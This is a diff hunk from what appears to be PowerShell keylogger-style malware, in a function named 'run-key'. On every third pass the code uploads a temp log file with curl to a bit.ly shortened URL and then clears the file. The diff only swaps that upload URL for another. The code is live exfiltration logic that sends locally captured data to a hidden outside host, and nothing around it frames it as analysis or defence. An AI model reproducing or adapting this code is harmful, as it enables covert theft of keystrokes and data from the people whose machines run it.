@@ -44,7 +44,7 @@ function run-key()
               if ($send -ge 3)
               {
                 $send = 0
-                cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3DHmzBN"
+                cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3yPnegN"
                 cmd.exe /c "echo.>%temp%\log.dat"
               }
             }
